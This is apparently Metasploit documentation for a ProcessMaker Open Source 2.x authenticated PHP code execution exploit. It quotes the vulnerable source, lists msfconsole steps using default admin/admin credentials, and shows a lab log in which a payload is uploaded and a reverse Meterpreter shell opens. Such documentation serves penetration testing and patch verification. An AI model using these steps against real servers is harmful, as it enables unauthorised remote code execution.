{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/processmaker_exec","result":{"data":{"moduleMetadataJson":{"id":"ad6021bd-6a88-5d7a-ab52-a707ea806e79","name":"ProcessMaker Open Source Authenticated PHP Code Execution","fullname":"exploit/multi/http/processmaker_exec","description":"This module exploits a PHP code execution vulnerability in the\n        'neoclassic' skin for ProcessMaker Open Source which allows any\n        authenticated user to execute PHP code. The vulnerable skin is\n        installed by default in version 2.x and cannot be removed via\n        the web interface.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/processmaker_exec","documentationSlug":"/modules/documentation/exploit/multi/http/processmaker_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a PHP code execution vulnerability in the default <em>neoclassic</em> skin for <a href=\"http://www.processmaker.com/\">ProcessMaker Open Source</a> which allows any authenticated user to execute PHP code. The vulnerable skin is installed by default in version 2.x prior to 2.5.2 and cannot be removed via the web interface.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  ProcessMaker is an open source, workflow management software suite, which includes tools to automate your workflow, design forms, create documents, assign roles and users, create routing rules, and map an individual process quickly and easily. It's relatively lightweight and doesn't require any kind of installation on the client computer.</p>\n<p>  This module has been tested successfully on ProcessMaker Open Source versions:</p>\n<ul>\n<li>2.5.1 on Windows XP SP3</li>\n<li>2.5.0 on Windows XP SP3</li>\n<li>2.0.45 on Debian Linux</li>\n<li>2.0.23 on Windows XP SP3</li>\n</ul>\n<p>  The vulnerability was patched in version 2.5.2.</p>\n<p>  Source and Installers:</p>\n<ul>\n<li><a href=\"https://sourceforge.net/projects/processmaker/files/ProcessMaker/2.0/\">ProcessMaker Open Source 2.0.x</a></li>\n<li><a href=\"https://sourceforge.net/projects/processmaker/files/ProcessMaker/2.5/\">ProcessMaker Open Source 2.5.x</a></li>\n</ul>\n<h2 id=\"technical-details\" style=\"position:relative;\"><a href=\"#technical-details\" aria-label=\"technical details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h2>\n<p>  Several files within the default <em>neoclassic</em> skin allow authenticated users to supply a PHP function in the <code class=\"language-text\">action</code> parameter and arguments for the aforementioned function in the <code class=\"language-text\">params</code> parameter. The application calls the supplied function name with the supplied parameters resulting in execution of arbitrary user supplied PHP code.</p>\n<p>  The relevant source code for the affected files is shown below.</p>\n<p>  <strong>appFolder/appFolderAjax.php</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token single-quoted-string string\">'rename'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$functionName</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span> <span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$functionParams</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span> <span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_REQUEST</span> <span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">array</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$functionName</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$functionParams</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>cases/casesStartPage_Ajax.php</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token variable\">$functionName</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$functionParams</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">array</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$functionName</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$functionParams</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>cases/cases_SchedulerGetPlugins.php</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token variable\">$functionName</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$functionParams</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'params'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">array</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$functionName</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$functionParams</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/processmaker_exec</code></li>\n<li>Do: <code class=\"language-text\">set username [USER]</code></li>\n<li>Do: <code class=\"language-text\">set password [PASS]</code></li>\n<li>Do: <code class=\"language-text\">set workspace [WORKSPACE]</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>Username</strong></p>\n<p>  The username for a ProcessMaker user (default: <code class=\"language-text\">admin</code>).</p>\n<p>  <strong>Password</strong></p>\n<p>  The password for the ProcessMaker user (default: <code class=\"language-text\">admin</code>).</p>\n<p>  <strong>Workspace</strong></p>\n<p>  The ProcessMaker workspace for which the specified user has access (default: <code class=\"language-text\">workflow</code>).</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(processmaker_exec) &gt; check\n[*] 192.168.172.135:80 - Authenticating as user &#39;admin&#39;\n[+] 192.168.172.135:80 - Authenticated as user &#39;admin&#39;\n[*] 192.168.172.135:80 - Sending check\n[+] The target is vulnerable.\n\nmsf exploit(processmaker_exec) &gt; exploit\n[*] Started reverse handler on 192.168.172.1:4444\n[*] 192.168.172.135:80 - Authenticating as user &#39;admin&#39;\n[+] 192.168.172.135:80 - Authenticated as user &#39;admin&#39;\n[*] 192.168.172.135:80 - Sending payload &#39;V7hd5EevO9Ho.php&#39; (1795 bytes)\n[+] 192.168.172.135:80 - Payload sent successfully\n[*] 192.168.172.135:80 - Retrieving file &#39;V7hd5EevO9Ho.php&#39;\n[*] Sending stage (39195 bytes) to 192.168.172.135\n[*] Meterpreter session 3 opened (192.168.172.1:4444 -&gt; 192.168.172.135:32789) at 2013-10-29 09:53:08 -0500\n[+] Deleted V7hd5EevO9Ho.php\n\n^C[-] Exploit failed: Interrupt\n\nmeterpreter &gt; getuid\nServer username: www-data (33)\nmeterpreter &gt; sysinfo\nComputer    : processmaker\nOS          : Linux processmaker 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64\nMeterpreter : php/php\nmeterpreter &gt; exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ad6021bd-6a88-5d7a-ab52-a707ea806e79"}}}